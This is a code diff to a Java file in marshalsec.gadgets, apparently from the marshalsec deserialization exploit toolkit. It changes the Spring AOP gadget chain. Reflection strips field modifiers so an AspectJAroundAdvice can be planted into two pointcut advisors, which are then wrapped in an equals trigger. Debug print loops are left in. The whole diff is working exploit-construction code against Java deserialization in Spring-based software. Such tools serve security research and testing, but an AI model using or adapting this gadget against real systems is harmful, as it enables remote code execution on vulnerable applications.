@@ -23,16 +23,21 @@ SOFTWARE.
 package marshalsec.gadgets;
 
 
+import java.io.File;
+import java.lang.reflect.Field;
 import java.lang.reflect.InvocationTargetException;
+import java.lang.reflect.Modifier;
 import java.util.HashSet;
 import java.util.Map;
 
+import org.aopalliance.aop.Advice;
 import org.apache.commons.logging.impl.NoOpLog;
 import org.springframework.aop.aspectj.AbstractAspectJAdvice;
 import org.springframework.aop.aspectj.AspectInstanceFactory;
 import org.springframework.aop.aspectj.AspectJAroundAdvice;
 import org.springframework.aop.aspectj.AspectJPointcutAdvisor;
 import org.springframework.aop.aspectj.annotation.BeanFactoryAspectInstanceFactory;
+import org.springframework.aop.support.AbstractBeanFactoryPointcutAdvisor;
 import org.springframework.aop.support.DefaultBeanFactoryPointcutAdvisor;
 import org.springframework.beans.factory.BeanFactory;
 import org.springframework.beans.factory.support.DefaultListableBeanFactory;
@@ -91,7 +96,42 @@ public final class SpringUtil {
         DefaultBeanFactoryPointcutAdvisor pcadv = new DefaultBeanFactoryPointcutAdvisor();
         pcadv.setBeanFactory(bf);
         pcadv.setAdviceBeanName(name);
-        return uf.makeEqualsTrigger(pcadv, new DefaultBeanFactoryPointcutAdvisor());
+        AbstractAspectJAdvice advice = Reflections.createWithoutConstructor(AspectJAroundAdvice.class);
+        //反射修改advice属性不是原子性的。
+        Field[] fields = AbstractBeanFactoryPointcutAdvisor.class.getDeclaredFields();
+
+        for(Field field : fields)
+
+        {
+
+            System.out.print(field.getName() +"->");
+            System.out.print(field.getModifiers());
+            System.out.println(Modifier.toString(field.getModifiers()));
+
+        }
+
+
+        Field ad = Reflections.getField(pcadv.getClass(),"advice");
+        ad.setAccessible(true);
+
+        Field modifiersField = Field.class.getDeclaredField("modifiers");
+        modifiersField.setAccessible(true);
+        modifiersField.setInt(ad,2);
+
+        pcadv.setAdvice(advice);
+
+        DefaultBeanFactoryPointcutAdvisor defaultBeanFactoryPointcutAdvisor = new DefaultBeanFactoryPointcutAdvisor();
+
+        Field ad2 = Reflections.getField(defaultBeanFactoryPointcutAdvisor.getClass(),"advice");
+        ad2.setAccessible(true);
+
+        Field modifiersField2 = Field.class.getDeclaredField("modifiers");
+        modifiersField2.setAccessible(true);
+        modifiersField2.setInt(ad2,2);
+
+        defaultBeanFactoryPointcutAdvisor.setAdvice(advice);
+
+        return uf.makeEqualsTrigger(pcadv, defaultBeanFactoryPointcutAdvisor);
     }
 
 
